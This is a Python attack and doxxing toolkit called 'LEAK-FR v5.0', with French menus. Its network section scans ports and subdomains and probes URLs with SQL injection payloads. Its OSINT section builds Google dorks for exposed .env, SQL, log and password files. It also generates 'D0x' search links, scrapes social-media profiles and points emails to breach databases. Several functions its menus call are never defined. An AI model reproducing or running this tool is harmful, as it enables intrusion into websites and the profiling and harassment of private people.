# -*- coding: utf-8 -*-
#!/usr/bin/env python3
# ========================================================================
#   LEAK-FR v5.0  |  By 31300-leak-fr  |  Blood Edition
#   Network · OSINT · Discord · VC · Builder · Web · HWID · VIP
# ========================================================================

import os, sys, json, socket, random, string, hashlib, platform
import time, re, subprocess, base64, shutil, struct, threading
from datetime import datetime

# ---- Windows terminal setup ----
if os.name == 'nt':
    os.system("title /kPfaGZYtK")
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW("/kPfaGZYtK")
        _k = ctypes.windll.kernel32
        _k.SetConsoleOutputCP(65001)
        _k.SetConsoleMode(_k.GetStdHandle(-11), 7)
    except Exception:
        pass
if hasattr(sys.stdout, 'reconfigure'):
    try: sys.stdout.reconfigure(encoding='utf-8')
    except Exception: pass


def pip(*pkgs):
    for p in pkgs:
        subprocess.run([sys.executable, "-m", "pip", "install", p,
                        "--quiet", "--disable-pip-version-check"], check=False)


try:
    import requests
except Exception:
    pip("requests"); import requests

try:
    from colorama import Fore, Back, Style, init as cinit
    cinit(autoreset=True, strip=False)
except Exception:
    pip("colorama")
    from colorama import Fore, Back, Style, init as cinit
    cinit(autoreset=True, strip=False)

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; B = Fore.BLUE
M = Fore.MAGENTA; C = Fore.CYAN; W = Fore.WHITE
DIM = Style.DIM; BRT = Style.BRIGHT; RST = Style.RESET_ALL
OK = f"{G}[+]{RST}"; ERR = f"{R}[-]{RST}"; INF = f"{Y}[~]{RST}"
VERSION = "5.0"


# ========================================================================
# BLOOD STYLE LAYER
# ========================================================================
import shutil as _shutil

CSI = '\033['
RESET_ANSI = CSI + '0m'
BOLD_ANSI  = CSI + '1m'
DIM_ANSI   = CSI + '2m'


def fg(n):
    return f'{CSI}38;5;{n}m'


# --- Palette de base ---
BLOOD_DEEP   = fg(52)
BLOOD_DARK   = fg(88)
BLOOD        = fg(124)
BLOOD_MID    = fg(160)
BLOOD_BRIGHT = fg(196)
BLOOD_LIGHT  = fg(203)
BLOOD_PALE   = fg(210)
ASH          = fg(245)
GHOST        = fg(238)

# --- Couleurs par catégorie ---
CAT_MALWARE  = fg(214)   # orange
CAT_SCAN     = fg(196)   # rouge vif
CAT_PANEL    = fg(51)    # cyan
CAT_NETWORK  = fg(46)    # vert vif

CAT_MALWARE_DARK  = fg(130)
CAT_SCAN_DARK     = fg(88)
CAT_PANEL_DARK    = fg(30)
CAT_NETWORK_DARK  = fg(28)


def _term_w():
    try:
        return _shutil.get_terminal_size((120, 40)).columns
    except Exception:
        return 120


_ANSI_RE = re.compile(r'\033\[[0-9;]*m')


def _vlen(s):
    return len(_ANSI_RE.sub('', s))


def _pad(s, w):
    n = _vlen(s)
    return s + ' ' * max(0, w - n)


# ========================================================================
# LOGO + SOUS-TITRE
# ========================================================================
LOGO_LINES = [
    r"██▓    ▓█████  ▄▄▄       ██ ▄█▀     █████▒██▀███  ",
    r"▓██▒    ▓█   ▀ ▒████▄     ██▄█▒     ▓██   ▒▓██ ▒ ██▒",
    r"▒██░    ▒███   ▒██  ▀█▄  ▓███▄░     ▒████ ░▓██ ░▄█ ▒",
    r"▒██░    ▒▓█  ▄ ░██▄▄▄▄██ ▓██ █▄     ░▓█▒  ░▒██▀▀█▄  ",
    r"░██████▒░▒████▒ ▓█   ▓██▒▒██▒ █▄    ░▒█░   ░██▓ ▒██▒",
    r"░ ▒░▓  ░░░ ▒░ ░ ▒▒   ▓▒█░▒ ▒▒ ▓▒     ▒ ░   ░ ▒▓ ░▒▓░",
    r"░ ░ ▒  ░ ░ ░  ░  ▒   ▒▒ ░░ ░▒ ▒░     ░       ░▒ ░ ▒░",
    r"  ░ ░      ░     ░   ▒   ░ ░░ ░      ░ ░     ░░   ░ ",
    r"    ░  ░   ░  ░     ░  ░░  ░                  ░     ",
]
LOGO_W   = max(_vlen(l) for l in LOGO_LINES)
SUBTITLE = "made by 31300 leak-fr"
TAGLINE  = "──[ L E A K · F R · T O O L ]──"


def clr():
    os.system("cls" if platform.system() == "Windows" else "clear")


def pause():
    input(f"\n{DIM}  [Entrée]{RST} ")


def save_out(name, content):
    os.makedirs("1-Output", exist_ok=True)
    p = os.path.join("1-Output", name)
    with open(p, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"\n{OK} Sauvegardé -> {Y}{p}{RST}")


def jget(url, headers=None, timeout=6):
    try:
        r = requests.get(url, headers=headers, timeout=timeout)
        return r.json()
    except Exception as e:
        return {"error": str(e)}


def pkv(d, indent=0):
    pad = "   " * indent
    for k, v in (d.items() if isinstance(d, dict) else []):
        if isinstance(v, dict):
            print(f"{pad}{C}{k}{RST}: ")
            pkv(v, indent + 1)
        else:
            print(f"{pad}{Y}{str(k):<22}{RST} {W}{v}{RST} ")


# ========================================================================
# BANNERS
# ========================================================================
def leakfr_banner(animated=False):
    clr()
    W = _term_w()

    logo_top  = LOGO_LINES[:4]
    logo_drip = LOGO_LINES[4:]

    for line in logo_top:
        pad = max(0, (W - LOGO_W) // 2)
        print(" " * pad + BOLD_ANSI + BLOOD_BRIGHT + line + RESET_ANSI)
    for line in logo_drip:
        pad = max(0, (W - LOGO_W) // 2)
        print(" " * pad + BLOOD_DARK + line + RESET_ANSI)

    pad_sub = max(0, (W - len(SUBTITLE)) // 2)
    print("")
    print(" " * pad_sub + BOLD_ANSI + BLOOD_LIGHT + SUBTITLE + RESET_ANSI)

    pad_tag = max(0, (W - len(TAGLINE)) // 2)
    print(" " * pad_tag + GHOST + TAGLINE + RESET_ANSI)
    print("")


def banner_main():
    leakfr_banner()


def banner_s(title):
    leakfr_banner()
    print(f"  {BLOOD_MID}{'═'*60}{RESET_ANSI}")
    print(f"  {BLOOD_MID}║{RESET_ANSI} {BOLD_ANSI}{BLOOD_LIGHT}{title:<58}{RESET_ANSI} {BLOOD_MID}║{RESET_ANSI}")
    print(f"  {BLOOD_MID}{'═'*60}{RESET_ANSI}\n")


def menu_box(title, opts, color=None):
    leakfr_banner()
    c_main   = color if color else BLOOD_MID
    c_accent = color if color else BLOOD_BRIGHT

    head = f"┌─[ {BOLD_ANSI}{c_accent}{title}{RESET_ANSI}{c_main} ]"
    fill = max(0, 58 - len(title) - 3)
    print(f"  {c_main}{head}{'─' * fill}┐{RESET_ANSI}")
    for n, t in opts:
        arrow = f"{c_accent}▸{RESET_ANSI}" if n != "00" else f"{BLOOD_DARK}◂{RESET_ANSI}"
        item = f" {arrow} {BLOOD_PALE}[{n}]{RESET_ANSI} {W}{t}{RESET_ANSI}"
        vis = 1 + 2 + 1 + len(n) + 2 + 1 + len(t)
        fpad = max(0, 58 - vis)
        print(f"  {c_main}│{RESET_ANSI}{item}" + " " * fpad + f"{c_main}│{RESET_ANSI}")
    print(f"  {c_main}└{'─' * 58}┘{RESET_ANSI}\n")

# ========================================================================
# NETWORK
# ========================================================================
def net_menu():
    while True:
        opts = [("01", "IP Lookup"), ("02", "Port Scanner"), ("03", "Pinger"),
                ("04", "Website Scanner"), ("05", "SQL Vuln Scanner"),
                ("06", "DNS Lookup"), ("07", "Subdomain Scanner"),
                ("08", "Header Grabber"), ("09", "Traceroute"),
                ("10", "Reverse IP Lookup"), ("11", "URL Scanner"),
                ("00", "Retour")]
        menu_box("NETWORK SCANNER", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": net_ip_lookup()
        elif c == "02": net_port_scan()
        elif c == "03": net_pinger()
        elif c == "04": net_website_scan()
        elif c == "05": net_sql_scan()
        elif c == "06": net_dns()
        elif c == "07": net_subdomain()
        elif c == "08": net_headers()
        elif c == "09": net_traceroute()
        elif c == "10": net_reverse_ip()
        elif c == "11": net_url_scan()
        elif c == "00": break


def net_ip_lookup():
    banner_s("IP LOOKUP")
    ip = input(f"  {W}IP: {RST}").strip()
    d = jget(f"http://ip-api.com/json/{ip}?fields=66846719")
    print(); pkv(d)
    save_out(f"ip_{ip}.txt", json.dumps(d, indent=2)); pause()


def net_port_scan():
    banner_s("PORT SCANNER")
    host = input(f"  {W}Host/IP: {RST} ").strip()
    rng = input(f"  {W}Range (ex: 1-1024 ou 80): {RST} ").strip()
    if "-" in rng:
        try:
            p1, p2 = map(int, rng.split("-"))
        except Exception:
            print(f"{ERR} Bad range. "); pause(); return
    else:
        try:
            p1 = p2 = int(rng)
        except Exception:
            print(f"{ERR} Bad port. "); pause(); return
    print(f"\n{INF} Scanning {Y}{host}{RST} {p1}->{p2}...\n ")
    open_p = []
    for port in range(p1, p2 + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.35)
        if s.connect_ex((host, port)) == 0:
            try: svc = socket.getservbyport(port)
            except Exception: svc = "?"
            print(f"  {G}[OPEN]{RST}  {BRT}{port}/tcp{RST}  {DIM}{svc}{RST} ")
            open_p.append(port)
        s.close()
    print(f"\n{OK} {G}{len(open_p)}{RST} open ports. ")
    save_out(f"ports_{host}.txt", f"Host:{host}\nOpen:{open_p} "); pause()


def net_pinger():
    banner_s("PINGER")
    host = input(f"  {W}Host/IP: {RST} ").strip()
    param = "-n" if platform.system() == "Windows" else "-c"
    res = subprocess.run(["ping", param, "4", host], capture_output=True, text=True)
    print(res.stdout); save_out(f"ping_{host}.txt", res.stdout); pause()


def net_website_scan():
    banner_s("WEBSITE SCANNER")
    url = input(f"  {W}URL: {RST} ").strip()
    try:
        r = requests.get(url, timeout=10)
        rows = [("Status", str(r.status_code)),
                ("Server", r.headers.get("Server", "N/A")),
                ("X-Powered-By", r.headers.get("X-Powered-By", "N/A")),
                ("Content-Type", r.headers.get("Content-Type", "N/A")),
                ("Length", r.headers.get("Content-Length", str(len(r.content)))),
                ("Final URL", r.url),
                ("Cookies", str(dict(r.cookies)))]
        print()
        for k, v in rows:
            print(f"  {Y}{k:<18}{RST} {W}{v}{RST} ")
        save_out(f"webscan_{url[:30].replace('/','_')}.txt",
                 "\n".join(f"{k}:{v}" for k, v in rows))
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def net_url_scan():
    banner_s("URL SCANNER")
    url = input(f"  {W}URL: {RST} ").strip()
    try:
        r = requests.get(url, timeout=10)
        links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
        scripts = re.findall(r'src=["\']([^"\']+)["\']', r.text)
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', r.text)
        print(f"\n  {Y}Links   {RST}: {W}{len(links)}{RST} ")
        print(f"  {Y}Scripts {RST}: {W}{len(scripts)}{RST} ")
        print(f"  {Y}Forms   {RST}: {W}{len(forms)}{RST}\n ")
        for l in links[:20]:   print(f"  {G}[LINK]{RST}   {DIM}{l[:80]}{RST} ")
        for s in scripts[:10]: print(f"  {C}[SCRIPT]{RST} {DIM}{s[:80]}{RST} ")
        for f in forms:        print(f"  {R}[FORM]{RST}   {DIM}{f[:80]}{RST} ")
        out = "\n".join(links + scripts + forms)
        save_out(f"urlscan_{url[:30].replace('/','_')}.txt", out)
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def net_sql_scan():
    banner_s("SQL VULN SCANNER")
    url = input(f"  {W}URL with param: {RST} ").strip()
    payloads = ["'", '"', "' OR '1'='1", "' OR 1=1--",
                "1 UNION SELECT NULL--", "' OR SLEEP(3)--", "1' ORDER BY 1--"]
    errors = ["sql syntax", "mysql_fetch", "unclosed quotation", "syntax error",
              "ORA-", "Microsoft OLE DB", "ODBC SQL"]
    print(f"\n{INF} Testing {len(payloads)} payloads...\n ")
    vuln = False
    for pl in payloads:
        try:
            r = requests.get(url + pl, timeout=5)
            hit = any(e.lower() in r.text.lower() for e in errors)
            tag = f"{G}[VULN]{RST} " if hit else f"{DIM}[SAFE]{RST} "
            if hit: vuln = True
            print(f"  {tag}  {pl} ")
        except Exception as e:
            print(f"  {R}[ERR]{RST}  {e} ")
    print(f"\n{INF} {'POSSIBLY VULNERABLE' if vuln else 'No obvious SQL errors'} ")
    pause()


def net_dns():
    banner_s("DNS LOOKUP")
    domain = input(f"  {W}Domain: {RST} ").strip()
    for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]:
        try:
            cmd = (["nslookup", f"-type={rtype}", domain]
                   if platform.system() == "Windows"
                   else ["dig", "+short", rtype, domain])
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            out = res.stdout.strip()
            if out:
                print(f"\n  {Y}{rtype}{RST}:\n  {W}{out}{RST} ")
        except Exception:
            pass
    pause()


def net_subdomain():
    banner_s("SUBDOMAIN SCANNER")
    domain = input(f"  {W}Domain: {RST} ").strip()
    wordlist = ["www", "mail", "ftp", "admin", "api", "dev", "test", "staging",
                "blog", "shop", "store", "app", "portal", "vpn", "remote",
                "cdn", "static", "media", "beta", "old", "new", "secure",
                "login", "auth", "panel", "cpanel", "webmail", "ns1", "ns2", "m"]
    print(f"\n{INF} Scanning {len(wordlist)} subdomains...\n ")
    found = []
    for sub in wordlist:
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            print(f"  {G}[FOUND]{RST}  {BRT}{full}{RST}  {DIM}-> {ip}{RST} ")
            found.append(f"{full} -> {ip}")
        except Exception:
            print(f"  {DIM}[MISS]   {full}{RST} ")
    save_out(f"subdomains_{domain}.txt", "\n".join(found)); pause()


def net_headers():
    banner_s("HEADER GRABBER")
    url = input(f"  {W}URL: {RST} ").strip()
    try:
        r = requests.get(url, timeout=8); print()
        for k, v in r.headers.items():
            print(f"  {Y}{k:<30}{RST} {W}{v}{RST} ")
        save_out(f"headers_{url[:30].replace('/','_')}.txt",
                 "\n".join(f"{k}: {v}" for k, v in r.headers.items()))
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def net_traceroute():
    banner_s("TRACEROUTE")
    host = input(f"  {W}Host/IP: {RST}").strip()
    cmd = ["tracert", host] if platform.system() == "Windows" else ["traceroute", host]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        print(res.stdout); save_out(f"traceroute_{host}.txt", res.stdout)
    except Exception as e:
        print(f"{ERR} {e}")
    pause()


def net_reverse_ip():
    banner_s("REVERSE IP LOOKUP")
    ip = input(f"  {W}IP: {RST}").strip()
    try:
        host = socket.gethostbyaddr(ip)
        print(f"\n  {Y}Hostname {RST}: {W}{host[0]}{RST}")
    except Exception as e:
        print(f"{ERR} {e}")
    d = jget(f"http://ip-api.com/json/{ip}")
    pkv(d); pause()


# ========================================================================
# OSINT (consolidé)
# ========================================================================
def osint_menu():
    while True:
        opts = [("01", "Username Tracker [50+ sites]"),
                ("02", "Email OSINT"),
                ("03", "Phone OSINT"),
                ("04", "Google Dorking"),
                ("05", "Image EXIF"),
                ("06", "D0x Create"),
                ("07", "D0x Tracker"),
                ("08", "Instagram OSINT"),
                ("09", "TikTok OSINT"),
                ("10", "Snapchat OSINT"),
                ("11", "Twitter/X OSINT"),
                ("12", "Face Recon"),
                ("13", "Steam ID Converter"),
                ("14", "Shodan Dorking"),
                ("15", "WHOIS Lookup"),
                ("00", "Retour")]
        menu_box("OSINT", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": osint_username()
        elif c == "02": osint_email_lookup()
        elif c == "03": osint_phone()
        elif c == "04": osint_dork()
        elif c == "05": osint_exif()
        elif c == "06": osint_dox()
        elif c == "07": osint_dox_tracker()
        elif c == "08": osint_instagram()
        elif c == "09": osint_tiktok()
        elif c == "10": osint_snapchat()
        elif c == "11": osint_twitter()
        elif c == "12": osint_face_recon()
        elif c == "13": osint_steam_id()
        elif c == "14": osint_shodan()
        elif c == "15": osint_whois()
        elif c == "00": break


def osint_dork():
    banner_s("GOOGLE DORKING")
    target = input(f"  {W}Target: {RST} ").strip()
    dorks = [f'site:{target}', f'site:{target} filetype:pdf', f'site:{target} filetype:sql',
             f'site:{target} filetype:env', f'site:{target} filetype:log',
             f'site:{target} intitle:"index of"', f'site:{target} inurl:admin',
             f'site:{target} inurl:login', f'site:{target} intext:"password"',
             f'site:{target} ext:bak', f'site:{target} inurl:config',
             f'"{target}" filetype:xls', f'intext:"{target}" site:pastebin.com']
    print(); lines = []
    for d in dorks:
        url = f"https://www.google.com/search?q={d.replace(' ','+')}"
        print(f"  {G}->{RST} {DIM}{d}{RST}\n     {Y}{url}{RST}\n ")
        lines.append(d + "\n" + url)
    save_out(f"dorks_{target}.txt", "\n\n".join(lines)); pause()


def osint_exif():
    banner_s("IMAGE EXIF DATA")
    try:
        from PIL import Image; from PIL.ExifTags import TAGS
    except Exception:
        pip("Pillow"); from PIL import Image; from PIL.ExifTags import TAGS
    path = input(f"  {W}Image path: {RST} ").strip()
    try:
        img = Image.open(path); exif = img.getexif()
        if not exif:
            print(f"\n{INF} No EXIF data. ")
        else:
            print(); out = []
            for tid, val in exif.items():
                tag = TAGS.get(tid, tid)
                print(f"  {Y}{str(tag):<30}{RST} {W}{val}{RST} ")
                out.append(f"{tag}: {val}")
            save_out(f"exif_{os.path.basename(path)}.txt",
                     "\n".join(str(x) for x in out))
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def osint_dox_tracker():
    banner_s("D0X TRACKER")
    target = input(f"  {W}Target name or username: {RST} ").strip()
    searches = [
        f"https://www.google.com/search?q={target}",
        f"https://www.google.com/search?q={target}+discord",
        f"https://www.google.com/search?q={target}+instagram",
        f"https://www.google.com/search?q={target}+steam",
        f"https://www.google.com/search?q={target}+roblox",
        f"https://www.google.com/search?q=site:pastebin.com+{target}",
        f"https://twitter.com/search?q={target}",
        f"https://www.tiktok.com/search?q={target}",
    ]
    print(f"\n  {INF} D0x tracking links for: {Y}{target}{RST}\n ")
    for s in searches:
        print(f"  {G}->{RST} {DIM}{s}{RST} ")
    save_out(f"dox_tracker_{target}.txt", "\n".join(searches)); pause()


def osint_username():
    banner_s("USERNAME TRACKER")
    user = input(f"  {W}Username: {RST} ").strip()
    sites = {
        "GitHub":      f"https://github.com/{user}",
        "Twitter/X":   f"https://x.com/{user}",
        "Instagram":   f"https://www.instagram.com/{user}/",
        "TikTok":      f"https://www.tiktok.com/@{user}",
        "Snapchat":    f"https://www.snapchat.com/add/{user}",
        "Reddit":      f"https://www.reddit.com/user/{user}",
        "YouTube":     f"https://www.youtube.com/@{user}",
        "Twitch":      f"https://www.twitch.tv/{user}",
        "Pinterest":   f"https://www.pinterest.com/{user}/",
        "LinkedIn":    f"https://www.linkedin.com/in/{user}",
        "Steam":       f"https://steamcommunity.com/id/{user}",
        "SoundCloud":  f"https://soundcloud.com/{user}",
        "Spotify":     f"https://open.spotify.com/user/{user}",
        "Tumblr":      f"https://{user}.tumblr.com",
        "DeviantArt":  f"https://www.deviantart.com/{user}",
        "Flickr":      f"https://www.flickr.com/people/{user}",
        "Medium":      f"https://medium.com/@{user}",
        "Vimeo":       f"https://vimeo.com/{user}",
        "GitLab":      f"https://gitlab.com/{user}",
        "Bitbucket":   f"https://bitbucket.org/{user}",
        "HackerNews":  f"https://news.ycombinator.com/user?id={user}",
        "Telegram":    f"https://t.me/{user}",
        "Roblox":      f"https://www.roblox.com/user.aspx?username={user}",
        "Minecraft":   f"https://namemc.com/profile/{user}",
        "Keybase":     f"https://keybase.io/{user}",
        "HackerOne":   f"https://hackerone.com/{user}",
        "Replit":      f"https://replit.com/@{user}",
        "Codepen":     f"https://codepen.io/{user}",
        "Behance":     f"https://www.behance.net/{user}",
        "Dribbble":    f"https://dribbble.com/{user}",
        "About.me":    f"https://about.me/{user}",
        "Wattpad":     f"https://www.wattpad.com/user/{user}",
        "Letterboxd":  f"https://letterboxd.com/{user}/",
        "MyAnimeList": f"https://myanimelist.net/profile/{user}",
        "VK":          f"https://vk.com/{user}",
    }
    not_found_strings = [
        "page not found", "user not found", "this account doesn't exist",
        "sorry, this page", "the link you followed", "profile not found",
        "account suspended", "no user found",
    ]
    print(f"\n{INF} Checking {len(sites)} platforms for @{user}...\n ")
    found_list = []
    import concurrent.futures
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    def check(name, url):
        try:
            r = requests.get(url, timeout=6, headers=hdrs, allow_redirects=True)
            body = r.text.lower()
            head = body[:2048]
            tm = re.search(r"<title[^>]*>([^<]+)</title>", body, re.I)
            title = tm.group(1).lower() if tm else ""
            if r.status_code == 200 and not any(s in head or s in title
                                                for s in not_found_strings):
                return (True, name, url, r.status_code)
            return (False, name, url, r.status_code)
        except Exception:
            return (None, name, url, 0)

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(check, n, u): (n, u) for n, u in sites.items()}
        for f in concurrent.futures.as_completed(futures):
            status, name, url, code = f.result()
            if status is True:
                print(f"  {G}[FOUND]{RST}   {W}{name:<20}{RST}  {Y}{url}{RST} ")
                found_list.append(f"[FOUND] {name}: {url} ")
            elif status is False:
                print(f"  {DIM}[NOT FOUND] {name:<20}  {code}{RST} ")
            else:
                print(f"  {DIM}[ERROR]     {name:<20}{RST} ")
    print(f"\n{OK} {len(found_list)}/{len(sites)} found @{user}")
    if found_list:
        save_out(f"username_{user}.txt", "\n".join(found_list))
    pause()


def osint_snapchat():
    banner_s("SNAPCHAT OSINT")
    username = input(f"  {W}Username: {RST}").strip().lstrip("@")
    hdrs = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15"}
    results = {}
    print(f"\n  {R}>> Profile{RST}")
    try:
        r = requests.get(f"https://www.snapchat.com/add/{username}",
                         headers=hdrs, timeout=8)
        results["status"] = r.status_code
        text = r.text
        pats = {
            "display_name":     r'"display_name":"([^"]+)"',
            "bio":              r'"bio":"([^"]*)"',
            "snap_score":       r'"snap_score":(\d+)',
            "subscriber_count": r'"subscriber_count":(\d+)',
            "profile_location": r'"location":"([^"]+)"',
            "website":          r'"website":"([^"]+)"',
            "user_id":          r'"user_id":"([^"]+)"',
            "bitmoji_id":       r'"bitmoji_id":"([^"]+)"',
        }
        for k, pat in pats.items():
            m = re.search(pat, text)
            if m: results[k] = m.group(1)
        found = r.status_code == 200
        print(f"  {Y}USERNAME      {RST}: {W}{username}{RST}")
        print(f"  {Y}STATUS        {RST}: {G if found else R}{'FOUND' if found else 'NOT FOUND'}{RST}")
        for k, v in results.items():
            if k != "status":
                print(f"  {Y}{k:<18}{RST}: {W}{str(v)[:80]}{RST}")
        print(f"  {Y}ADD URL       {RST}: {W}https://www.snapchat.com/add/{username}{RST}")
    except Exception as e:
        print(f"{ERR} {e}")
    save_out(f"snapchat_{username}.txt",
             "\n".join(f"{k}: {v}" for k, v in results.items()))
    print(f"\n{OK} Rapport sauvegarde.")
    pause()


def osint_instagram():
    banner_s("INSTAGRAM OSINT")
    username = input(f"  {W}Username: {RST}").strip().lstrip("@")
    hdrs = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) "
                          "AppleWebKit/605.1.15 Mobile/15E148 Instagram 278.0.0.17.102"}
    try:
        r = requests.get(f"https://www.instagram.com/{username}/?__a=1&__d=dis",
                         headers=hdrs, timeout=8)
        data = {}
        try:
            data = r.json().get("graphql", {}).get("user", {})
        except Exception:
            text = r.text
            pats = {
                "followers":   r'"edge_followed_by":\{"count":(\d+)',
                "following":   r'"edge_follow":\{"count":(\d+)',
                "posts":       r'"edge_owner_to_timeline_media":\{"count":(\d+)',
                "bio":         r'"biography":"([^"]*)"',
                "full_name":   r'"full_name":"([^"]*)"',
                "is_private":  r'"is_private":(true|false)',
                "is_verified": r'"is_verified":(true|false)',
            }
            for k, pat in pats.items():
                m = re.search(pat, text)
                if m: data[k] = m.group(1)
        priv = data.get("is_private", "?")
        ver  = data.get("is_verified", "?")
        print(f"\n  {Y}USERNAME    {RST}: {W}@{username}{RST} ")
        print(f"  {Y}FULL NAME   {RST}: {W}{data.get('full_name','?')[:40]}{RST} ")
        print(f"  {Y}BIO         {RST}: {W}{data.get('bio','?')[:80]}{RST} ")
        print(f"  {Y}FOLLOWERS   {RST}: {W}{data.get('followers','?')}{RST} ")
        print(f"  {Y}FOLLOWING   {RST}: {W}{data.get('following','?')}{RST} ")
        print(f"  {Y}POSTS       {RST}: {W}{data.get('posts','?')}{RST} ")
        print(f"  {Y}PRIVATE     {RST}: {R if priv == 'true' else G}{priv}{RST} ")
        print(f"  {Y}VERIFIED    {RST}: {G if ver == 'true' else DIM}{ver}{RST} ")
        save_out(f"instagram_{username}.txt", str(data))
        print(f"\n{OK} Saved.")
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def osint_tiktok():
    banner_s("TIKTOK OSINT")
    username = input(f"  {W}Username (@sans @): {RST}").strip().lstrip("@")
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8"}
    try:
        r = requests.get(f"https://www.tiktok.com/@{username}", headers=hdrs, timeout=10)
        text = r.text
        fields = {
            "Followers": r'"followerCount":(\d+)',
            "Following": r'"followingCount":(\d+)',
            "Likes":     r'"heartCount":(\d+)',
            "Videos":    r'"videoCount":(\d+)',
            "Bio":       r'"signature":"([^"]*)"',
            "Verified":  r'"verified":(true|false)',
            "User ID":   r'"authorId":"([^"]+)"',
            "Nickname":  r'"nickname":"([^"]+)"',
            "Region":    r'"region":"([^"]+)"',
        }
        found = {}
        for label, pat in fields.items():
            m = re.search(pat, text)
            if m:
                found[label] = m.group(1).replace("\\u0026", "&")
        print(f"\n  {Y}USERNAME   {RST}: {W}@{username}{RST} ")
        for k, v in found.items():
            print(f"  {Y}{k:<12}{RST}: {W}{v[:80]}{RST} ")
        if found:
            save_out(f"tiktok_{username}.txt",
                     "\n".join(f"{k}: {v}" for k, v in found.items()))
            print(f"\n{OK} Saved.")
        else:
            print(f"\n{DIM}[-] No data extracted.{RST}")
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def osint_twitter():
    banner_s("TWITTER/X OSINT")
    username = input(f"  {W}Username (@sans @): {RST}").strip().lstrip("@")
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        r = requests.get(f"https://nitter.privacydev.net/{username}", headers=hdrs, timeout=8)
        if r.status_code != 200:
            r = requests.get(f"https://nitter.net/{username}", headers=hdrs, timeout=8)
        text = r.text
        fields = {
            "Display Name": r'<a class="profile-card-fullname"[^>]*>([^<]+)<',
            "Bio":          r'<div class="profile-bio"[^>]*><p>([^<]+)<',
            "Location":     r'<div class="profile-location"[^>]*>.*?<span>([^<]+)<',
        }
        print(f"\n  {Y}USERNAME   {RST}: {W}@{username}{RST} ")
        found = {}
        for label, pat in fields.items():
            m = re.search(pat, text, re.DOTALL)
            if m:
                val = re.sub(r'\s+', ' ', m.group(1)).strip()
                found[label] = val
                print(f"  {Y}{label:<14}{RST}: {W}{val[:80]}{RST} ")
        print(f"  {Y}URL        {RST}: {W}https://x.com/{username}{RST} ")
        if found:
            save_out(f"twitter_{username}.txt",
                     "\n".join(f"{k}: {v}" for k, v in found.items()))
            print(f"\n{OK} Saved.")
    except Exception as e:
        print(f"{ERR} {e} ")
    pause()


def osint_phone():
    banner_s("PHONE NUMBER OSINT")
    phone = input(f"  {W}Phone number: {RST}").strip()
    num = re.sub(r'[\s\-\.\(\)]', '', phone)
    if not num.startswith("+"):
        num = "+" + num
    print(f"\n{INF} Analyzing {num}...\n ")
    prefixes = {"+1": "USA/Canada", "+33": "France", "+44": "UK", "+49": "Germany",
                "+34": "Spain", "+39": "Italy", "+31": "Netherlands", "+32": "Belgium",
                "+41": "Switzerland", "+7": "Russia", "+86": "China", "+91": "India",
                "+55": "Brazil", "+61": "Australia", "+212": "Morocco"}
    country = "Unknown"
    for prefix, name in sorted(prefixes.items(), key=lambda x: -len(x[0])):
        if num.startswith(prefix):
            country = name; break
    print(f"  {Y}NUMBER    {RST}: {W}{num}{RST} ")
    print(f"  {Y}COUNTRY   {RST}: {W}{country}{RST} ")
    dorks = [("Google", f"https://www.google.com/search?q=%22{num}%22"),
             ("Truecaller", f"https://www.truecaller.com/search/fr/{num[1:]}"),
             ("Telegram", f"https://t.me/{num[1:]}"),
             ("WhatsApp", f"https://api.whatsapp.com/send?phone={num[1:]}")]
    print(f"\n  {Y}RECON LINKS:{RST} ")
    for name, link in dorks:
        print(f"  {G}[{name:<12}]{RST}  {DIM}{link[:80]}{RST} ")
    out = f"Phone: {num}\nCountry: {country}\n\n"
    out += "".join(f"{n}: {l}\n" for n, l in dorks)
    save_out(f"phone_{num.replace('+','')}.txt", out)
    print(f"\n{OK} Saved.")
    pause()


def osint_email_lookup():
    banner_s("EMAIL OSINT")
    email = input(f"  {W}Email address: {RST}").strip().lower()
    user, domain = email.split("@") if "@" in email else (email, "")
    print(f"\n  {Y}EMAIL     {RST}: {W}{email}{RST} ")
    print(f"  {Y}USER      {RST}: {W}{user}{RST} ")
    print(f"  {Y}DOMAIN    {RST}: {W}{domain}{RST} ")
    gh = hashlib.md5(email.encode()).hexdigest()
    print(f"  {Y}GRAVATAR  {RST}: {W}https://www.gravatar.com/avatar/{gh}?d=404{RST} ")
    dorks = [("Google", f"https://www.google.com/search?q=%22{email}%22"),
             ("HIBP", f"https://haveibeenpwned.com/account/{email}"),
             ("Dehashed", f"https://dehashed.com/search?query={email}"),
             ("IntelX", f"https://intelx.io/?s={email}"),
             ("Hunter.io", f"https://hunter.io/email-verifier/{email}")]
    print(f"\n  {Y}RECON LINKS:{RST} ")
    for name, link in dorks:
        print(f"  {G}[{name:<12}]{RST}  {DIM}{link[:80]}{RST} ")
    out = f"Email: {email}\nGravatar: https://www.gravatar.com/avatar/{gh}\n\n"
    out += "".join(f"{n}: {l}\n" for n, l in dorks)
    save_out(f"email_{user}_{domain}.txt", out)
    print(f"\n{OK} Saved.")
    pause()

